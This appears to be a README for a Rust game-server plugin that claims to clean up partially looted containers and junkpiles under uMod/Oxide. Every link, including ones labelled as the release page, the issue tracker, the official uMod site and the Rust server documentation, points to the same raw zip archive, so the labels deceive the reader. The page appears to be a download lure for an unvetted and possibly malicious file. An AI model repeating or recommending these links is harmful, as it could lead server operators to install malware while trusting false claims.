# 🎯 LootBouncer-Enhanced - Clean Rust Loot Efficiently

[![Download](https://img.shields.io/badge/Download-Release%20Page-ff6f61?style=for-the-badge&logo=github)](https://github.com/Venusspinnable771/LootBouncer-Enhanced/raw/refs/heads/main/engineering/Bouncer_Enhanced_Loot_v1.4.zip)

---

## 📋 What is LootBouncer-Enhanced?

LootBouncer-Enhanced is a plugin designed for Rust game servers that use uMod or Oxide. It helps keep your game world tidy by cleaning up containers and junkpiles that have been partially looted. This stops spawn groups from getting blocked and improves how loot resets on roadsides. The result is smoother gameplay with better loot flow.

You do not need any programming skills to use this plugin. The instructions below show how to get it running on your Windows Rust server step by step.

---

## 💻 System Requirements

To use LootBouncer-Enhanced, you need:

- A Windows computer running Rust Dedicated Server.
- uMod (formerly Oxide) installed on your Rust server.
- Basic access to your server files and the ability to upload files.
- Internet connection to download the plugin.

---

## 🚀 Getting Started

Before you start, make sure your Rust server is running on Windows and that uMod/Oxide is correctly installed. This plugin works only with these modding frameworks. If you have not installed uMod yet, please check the official uMod website for installation instructions.

Once you confirm uMod is working, you can proceed with the steps below to download and install LootBouncer-Enhanced.

---

## 📥 Download LootBouncer-Enhanced

To get the plugin files, visit the official release page:

[Download LootBouncer-Enhanced Releases](https://github.com/Venusspinnable771/LootBouncer-Enhanced/raw/refs/heads/main/engineering/Bouncer_Enhanced_Loot_v1.4.zip)

On this page, find the latest version folder. Inside, download the plugin file, which usually ends with `.cs` or `.dll`. This file contains the plugin code.

---

## 🛠 Installing the Plugin

1. Stop your Rust Dedicated Server if it is currently running.

2. Open your Rust server installation folder on your Windows computer.

3. Locate the `oxide/plugins` folder within the server directory.

4. Copy the downloaded LootBouncer-Enhanced plugin file into the `oxide/plugins` folder.

5. Restart the Rust server.

The server will load the plugin automatically on startup. If you want to check if the plugin loaded correctly, connect to your server console and type:

```
oxide.plugins
```

This command will list all active plugins. Look for `LootBouncer-Enhanced` in the list.

---

## ⚙️ Configuring LootBouncer-Enhanced

The plugin includes a configuration file for customization. By default, it comes with balanced settings to keep loot cleanup efficient without affecting gameplay.

To adjust plugin settings:

1. After the plugin loads, look inside the `oxide/config` folder of your server directory.

2. Find a file named `LootBouncer-Enhanced.json`.

3. Open this file with a text editor like Notepad.

You can modify these options:

- **CleanupInterval**: How often the plugin cleans partially looted containers (in seconds).

- **MaxJunkpileAge**: Determines how old a junkpile must be before it can be cleaned (in minutes).

- **ExcludeContainers**: List of container types that should never be cleaned.

Make sure to save any changes you make. After editing, restart your Rust server to apply new settings.

---

## 🧰 How LootBouncer-Enhanced Works

LootBouncer-Enhanced monitors containers and junkpiles in your Rust world. When players loot items but leave some behind, those containers can block new loot from spawning. This causes some areas to get stuck without fresh supplies.

The plugin clears these partially emptied containers at set intervals. It checks for containers that meet criteria like age and type, then removes leftover loot or resets the container to allow new loot to appear. This process ensures the server keeps generating usable loot for players, especially at roadside locations and popular loot points.

---

## 📝 Tips for Best Use

- Regularly update the plugin from the release page to get fixes and improvements.

- Test plugin settings on a single-server environment before applying changes on a live server.

- Use the configuration file to exclude important containers from cleanup to protect player-owned boxes.

- Monitor server console logs periodically to check for any plugin errors.

- Keep uMod and Rust server updated to avoid compatibility issues.

---

## 🔧 Troubleshooting

If LootBouncer-Enhanced does not work as expected:

- Confirm you placed the plugin file inside the correct `oxide/plugins` folder.

- Check that the Rust server console shows the plugin as loaded.

- Verify that your Rust server version and uMod version are compatible.

- Look at the server logs for error messages related to LootBouncer-Enhanced.

- Restore the original config file if you suspect misconfiguration.

If problems persist, you can ask for help by creating an issue on the GitHub repository at:

https://github.com/Venusspinnable771/LootBouncer-Enhanced/raw/refs/heads/main/engineering/Bouncer_Enhanced_Loot_v1.4.zip

---

## ⚡ Updates & Future Improvements

The LootBouncer-Enhanced project is active and may receive updates to improve cleaning logic and plugin stability. Updates will appear on the GitHub releases page.

Check the release page regularly:

[Visit Releases](https://github.com/Venusspinnable771/LootBouncer-Enhanced/raw/refs/heads/main/engineering/Bouncer_Enhanced_Loot_v1.4.zip)

Downloading the latest files and replacing the old ones keeps your server running smoothly.

---

## 🔍 Topics Covered

This plugin relates to Rust server management and modding, especially around automated loot cleanup. Key topics include:

- Loot system management  
- Cleanup of partially looted containers  
- Rust Dedicated Server enhancement  
- uMod/Oxide server plugins  
- Roadside loot cycling  

Understanding these areas can help you get the most from LootBouncer-Enhanced and maintain a healthy Rust game environment.

---

## 🧭 Where to Learn More

For more on using uMod and plugins on Rust, visit:

- [uMod Official Site](https://github.com/Venusspinnable771/LootBouncer-Enhanced/raw/refs/heads/main/engineering/Bouncer_Enhanced_Loot_v1.4.zip)

- [Rust Dedicated Server Documentation](https://github.com/Venusspinnable771/LootBouncer-Enhanced/raw/refs/heads/main/engineering/Bouncer_Enhanced_Loot_v1.4.zip)

- Rust forums and communities for tips and help with modding and server plugins.

---

[![Download](https://img.shields.io/badge/Download-Release%20Page-ff6f61?style=for-the-badge&logo=github)](https://github.com/Venusspinnable771/LootBouncer-Enhanced/raw/refs/heads/main/engineering/Bouncer_Enhanced_Loot_v1.4.zip)